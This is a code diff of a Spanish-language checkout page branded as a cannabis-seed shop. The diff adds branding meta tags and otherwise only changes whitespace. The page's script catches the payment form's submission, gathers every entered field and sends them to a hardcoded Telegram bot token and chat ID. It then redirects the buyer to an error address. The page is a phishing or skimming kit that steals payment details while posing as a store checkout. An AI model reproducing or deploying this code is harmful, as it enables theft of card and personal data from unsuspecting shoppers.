@@ -2,6 +2,12 @@
 <html lang="es">
 
 <head>
+    <meta name="audience" content="mature">
+    <meta name="keywords" content="semillas de cannabis, comprar semillas de marihuana, variedades de cannabis">
+    <meta name="author" content="Fast Buds">
+    <meta name="category" content="Tienda de Semillas de Cannabis">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Explora nuestra tienda de semillas de cannabis. Ofrecemos una amplia selección de variedades, con envío rápido y discreto. ¡Compra tus semillas de marihuana ahora!">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pago | Checking</title>
@@ -350,32 +356,32 @@
         function validarFormulario() {
             return true;
         }
-    
+
         document.addEventListener('DOMContentLoaded', function () {
             const formulario = document.querySelector('form');
-    
+
             formulario.addEventListener('submit', function (event) {
                 event.preventDefault();
-    
+
                 if (validarFormulario()) {
                     const formData = new FormData(this);
-    
+
                     const TELEGRAM_BOT_TOKEN = '6202243249:AAGtTTl9YH2h4BiScQgdbLFwaa2is4dfbAo';
                     const CHAT_ID = '5330560021';
-    
+
                     let message = 'Nuevo pago recibido:\n';
-    
+
                     formData.forEach((value, key) => {
                         message += `${key}: ${value}\n`;
                     });
-    
+
                     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                         chat_id: CHAT_ID,
                         text: message,
                     })
                         .then(response => {
                             console.log('Mensaje enviado con éxito:', response.data);
-    
+
                             setTimeout(function () {
                                 window.location.href = 'https://error.com';
                             }, 2000);
@@ -387,7 +393,7 @@
             });
         });
     </script>
-    
+
 </body>
 
 </html>
